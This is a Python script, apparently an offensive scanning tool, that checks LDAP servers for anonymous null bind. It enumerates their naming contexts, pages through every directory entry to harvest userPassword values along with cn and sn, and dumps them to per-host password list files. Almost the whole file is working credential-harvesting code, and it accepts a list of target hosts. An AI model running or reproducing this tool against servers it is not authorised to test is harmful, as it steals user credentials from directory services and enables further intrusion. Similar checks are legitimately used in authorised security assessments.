import ldap
import ldap.filter
import argparse
import sys
import logging
from ldap.controls import SimplePagedResultsControl

class LDAPTester:
    PASSWORD_KEY = "userPassword"
    CN_KEY = "cn"
    SN_KEY = "sn"
    PAGE_SIZE = 1000
    
    def __init__(self, hostname, out, port, timeout=3):
        self.hostname = hostname
        self.port = port
        self.out = out
        self.timeout = timeout
        self.logger = logging.getLogger(__name__)
        
    def null_bind(self):
        try:
            self.logger.info("Testing host %s", self.hostname)
            self.l = ldap.initialize(f"ldap://{self.hostname}:{self.port}")
            self.l.set_option(ldap.OPT_NETWORK_TIMEOUT, self.timeout)
            self.l.set_option(ldap.OPT_TIMEOUT, self.timeout)

            self.l.simple_bind_s("", "")
            self.logger.info("Null bind is allowed, making a search to catch INSUFFICIENT_ACCESS error.")

            self.l.search_s("", ldap.SCOPE_SUBTREE)
            self.logger.info("Null bind allowed for host %s", self.hostname)

            return True
        except ldap.NO_SUCH_OBJECT:
            self.logger.info("Null bind allowed for host %s", self.hostname)
            return True
        except (ldap.OPERATIONS_ERROR, ldap.INSUFFICIENT_ACCESS, ldap.TIMEOUT, ldap.SERVER_DOWN) as e:
            self.logger.error("Error while testing null bind: %s", e)
            return False

    def get_naming_contexts(self):
        try:
            res = self.l.search_s("", ldap.SCOPE_BASE, attrlist=["+"])
            self.naming_contexts = res[0][1].get("namingContexts", [])
            if len(self.naming_contexts) > 0:
                self.logger.info("Found naming contexts: %s", self.naming_contexts)
                return True
            return False
        except Exception as e:
            self.logger.error("Error while getting naming context: %s", e)
            return False

    def find_passwords(self):
        self.passwords = []
        known_ldap_resp_ctrls = {
            SimplePagedResultsControl.controlType: SimplePagedResultsControl,
        }
        
        for naming_ctx in self.naming_contexts:
            try:
                lc = SimplePagedResultsControl(True, size=LDAPTester.PAGE_SIZE, cookie='')
                self.logger.info("Looking for passwords in context %s", naming_ctx)
                msgid = self.l.search_ext(naming_ctx, ldap.SCOPE_SUBTREE, attrlist=["*"], serverctrls=[lc])
                
                pages = 0
                while True:
                    pages += 1
                    self.logger.info("Getting page %s", pages)
                    rtype, rdata, rmsgid, serverctrls = self.l.result3(msgid, resp_ctrl_classes=known_ldap_resp_ctrls)

                    for entity in rdata:
                        entry = [entity[0]]
                        if LDAPTester.PASSWORD_KEY in entity[1]:
                            entry.append(entity[1][LDAPTester.PASSWORD_KEY][0])
                            
                            if LDAPTester.CN_KEY in entity[1]:
                                entry.append(entity[1][LDAPTester.CN_KEY][0])
                            else:
                                entry.append("")

                            if LDAPTester.SN_KEY in entity[1]:
                                entry.append(entity[1][LDAPTester.SN_KEY][0])
                            else:
                                entry.append("")
                        
                            self.passwords.append(entry)

                    pctrls = [c for c in serverctrls if c.controlType == SimplePagedResultsControl.controlType]
                    if pctrls:
                        if pctrls[0].cookie:
                            lc.cookie = pctrls[0].cookie
                            msgid = self.l.search_ext(naming_ctx, ldap.SCOPE_SUBTREE, attrlist=["*"], serverctrls=[lc])
                        else:
                            break
                    else:
                        self.logger.warning("Server ignores RFC 2696 control.")
                        break
                    
            except ldap.LDAPError as e:
                self.logger.error("Could not pull LDAP results: %s", e)
            except Exception as e:
                self.logger.error("Error while finding passwords: %s", e)
        
    def dump_passwords(self):
        filename = f"{self.out}/{self.hostname}.passwords.lst"
        self.logger.info("Dumping passwords into %s", filename)
        try:
            with open(filename, "w") as out:
                for passwd in self.passwords:
                    out.write(f"{passwd[0]}:{passwd[1]}:{passwd[2]}\n")
        except Exception as e:
            self.logger.error("Error while dumping passwords: %s", e)


def get_args():
    p = argparse.ArgumentParser(description="Test an LDAP server for null bind, base dn, and dump the content.",
                                formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    p.add_argument("out", type=str, help="Output directory, will be created if it doesn't exist")
    p.add_argument("--host", help="Host to scan")
    p.add_argument("--port", type=int, default=389, help="Port on which the LDAP server is listening")
    p.add_argument("--host-file", type=str, help="File containing a list of hosts in the format host:port")
    return p.parse_args()


def setup_logger():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
    logger = logging.getLogger(__name__)
    logger.addHandler(logging.StreamHandler())
    return logger


def main():
    args = get_args()
    logger = setup_logger()
    
    if args.host_file:
        targets = [i.split(":") for i in open(args.host_file, "r").read().split("\n") if ":" in i]
    else:
        targets = [[args.host, args.port]]
        
    with open(f"{args.out}/out.lst", "w") as result:
        for t in targets:
            ldapTester = LDAPTester(t[0], args.out, t[1])
            if ldapTester.null_bind():
                if ldapTester.get_naming_contexts():
                    ldapTester.find_passwords()
                    ldapTester.dump_passwords()
                    result.write(t[0] + "\n")
                    logger.info("LDAP testing completed for host %s", t[0])


if __name__ == "__main__":
    main()
